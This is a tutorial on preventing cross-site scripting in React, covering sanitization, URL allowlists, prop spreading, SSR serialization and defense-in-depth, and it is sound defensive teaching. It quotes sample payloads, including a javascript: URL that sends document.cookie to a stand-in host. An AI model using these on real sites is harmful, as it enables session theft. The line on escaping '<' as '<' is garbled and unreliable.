## Cross-site scripting (XSS)

XSS happens when attacker-controlled data ends up **executed** as code in another user's browser: stealing sessions, acting on their behalf, rewriting the page. React blocks the most common form for free, which makes the remaining holes easy to miss.

## React escapes text by default

Anything you render inside braces becomes a **text node**, never markup:

```jsx
const comment = '<img src=x onerror="stealCookies()">';
<p>{comment}</p>
// the user sees the literal string; no <img> is created
```

The same applies to attribute values: React sets them through DOM APIs, so quotes cannot break out of an attribute.

## Hole 1: `dangerouslySetInnerHTML`

The name is the warning. It inserts a raw HTML string:

```jsx
<div dangerouslySetInnerHTML={{ __html: userBio }} />
```

If `userBio` comes from a user, an `<img onerror>` or `<svg onload>` runs immediately. Only use it with HTML you **sanitize** with an allowlist (tags and attributes you explicitly permit) or that you fully control (output of your own Markdown renderer configured to escape HTML).

```jsx
import DOMPurify from 'dompurify';

<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userBio) }} />
```

In production use a battle-tested sanitizer such as **DOMPurify**, or the browser's HTML Sanitizer API (`element.setHTML()`) where available. Never write a **denylist** ("remove `<script>`"): there are dozens of ways to execute script (`onerror`, `onload`, `<svg>`, `<math>`, `srcdoc`, mutation tricks). In this lesson you build a tiny allowlist sanitizer to understand how they work: parse into an **inert** `<template>` (scripts do not run and images do not load), walk the tree, keep only allowed elements and attributes, serialize back.

## Hole 2: dangerous URLs

```jsx
<a href={user.website}>Website</a>
```

If `website` is `javascript:fetch('//evil.example?c=' + document.cookie)`, clicking runs it. React 19 replaces `javascript:` URLs in `href`, `src`, `action` and `formAction` with a URL that throws, but `data:text/html,...`, `vbscript:` and other schemes are not React's job. Validate user URLs with an **allowlist of protocols** using the `URL` parser (it normalizes case, whitespace and tabs that string checks miss):

```js
const safe = ['http:', 'https:', 'mailto:'].includes(new URL(url, location.origin).protocol);
```

For links opened in a new tab, add `rel="noopener noreferrer"` so the new page cannot reach your `window.opener` (modern browsers imply `noopener` for `target="_blank"`, but being explicit also covers `noreferrer`).

## Hole 3: spreading untrusted objects

```jsx
<div {...JSON.parse(userSettings)} />
```

An attacker can send `{ "dangerouslySetInnerHTML": { "__html": "..." } }` or an `href`. Pick the props you expect instead of spreading arbitrary objects.

## Hole 4: serializing state into HTML

During SSR you often embed initial data in a script:

```jsx
<script dangerouslySetInnerHTML={{ __html: `window.__DATA__ = ${JSON.stringify(data)}` }} />
```

If any string contains `</script><script>alert(1)</script>`, it closes your tag. Escape `<` as `<` (frameworks such as Next.js and React Router do this for you) or use a serializer like `serialize-javascript`.

## Server-side React is a server

- **Server Functions** (`'use server'`) are public HTTP endpoints. Anyone can call them with any arguments: validate input (Zod) and check authentication and authorization inside every function.
- Do not pass secrets or full database records to Client Components: every prop crosses the network.
- Keep React and your framework patched. In December 2025, **CVE-2025-55182 ("React2Shell")** disclosed a critical remote code execution flaw in the React Server Components protocol, with follow-up fixes the same month; Next.js and other RSC frameworks shipped patched releases.

## Defense in depth

- **Content Security Policy** (`Content-Security-Policy: script-src 'self' 'nonce-...'`) stops injected inline scripts even if a bug slips through. Frameworks support per-request nonces.
- **Trusted Types** make the browser reject raw strings in sinks like `innerHTML` unless they pass through a policy.
- Store session tokens in `HttpOnly`, `Secure`, `SameSite` cookies rather than `localStorage`, which any XSS can read.
- Audit dependencies (`npm audit`, lockfiles, provenance): a compromised package runs with your privileges.
